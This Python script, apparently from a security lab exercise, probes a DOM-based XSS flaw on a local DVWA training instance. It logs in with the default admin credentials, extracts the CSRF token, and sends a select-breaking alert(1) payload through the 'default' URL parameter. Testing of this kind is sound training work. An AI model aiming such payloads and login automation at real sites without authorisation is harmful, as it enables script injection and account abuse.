#!/usr/bin/env python3
"""Test DOM XSS on DVWA xss_d page."""
import requests
import re

base = "http://127.0.0.1:8080"
session = requests.Session()

# Use the known session cookies
session.cookies.set("PHPSESSID", "9kk32r8pdi340ch33to4hbg0s2", domain="127.0.0.1")
session.cookies.set("security", "low", domain="127.0.0.1")

# Fetch the xss_d page
r = session.get(f"{base}/vulnerabilities/xss_d/")
print(f"Status: {r.status_code}")
print(f"Content-Length: {len(r.text)}")

# Check if logged in
if "Username:" in r.text and "admin" in r.text:
    print("[+] Authenticated as admin")
else:
    print("[-] Not authenticated - refreshing login")
    # Get login page with CSRF token
    r2 = session.get(f"{base}/login.php")
    m = re.search(r'name=\'user_token\' value=\'([^\']+)\'', r2.text)
    if m:
        token = m.group(1)
        print(f"[+] Got CSRF token: {token}")
        # Login
        r3 = session.post(f"{base}/login.php", data={
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": token
        })
        print(f"Login status: {r3.status_code}")
        if r3.status_code == 302:
            print("[+] Login successful (redirect)")
        # Try xss_d again
        r = session.get(f"{base}/vulnerabilities/xss_d/")
        print(f"After login - Status: {r.status_code}")
        if "Username:" in r.text and "admin" in r.text:
            print("[+] Authenticated as admin after login")
        else:
            print("[-] Still not authenticated")

# Extract and show the vulnerable JS code
# The inline JS is in the select element
print("\n=== Page Source (vulnerable part) ===")
# Find the script tag with the vulnerable code
start = r.text.find("<script>")
if start > 0:
    end = r.text.find("</script>", start)
    print(r.text[start:end+9])

print("\n=== Testing XSS injection ===")
# Test with a simple payload
payload = "English</option></select><script>alert(1)</script>"
import urllib.parse
test_url = f"{base}/vulnerabilities/xss_d/?default={urllib.parse.quote(payload)}"
print(f"Test URL: {test_url}")
r2 = session.get(test_url)
print(f"Status: {r2.status_code}")
# The injected code won't appear in HTTP response (DOM-based)
# But we can check the original source still shows the vulnerable code
if "document.write" in r2.text:
    print("[+] Vulnerable JS code confirmed in response")
    # Show the relevant script block
    s = r2.text.find("<script>")
    e = r2.text.find("</script>", s)
    print(r2.text[s:e+9])

print("\n=== Proof of concept ===")
print("The page at /vulnerabilities/xss_d/ contains client-side JavaScript")
print("that reads the 'default' parameter from document.location.href and")
print("writes it directly to the DOM via document.write() without sanitization.")
print("An attacker can inject arbitrary HTML/JavaScript by crafting a URL with")
print("a malicious 'default' parameter value.")
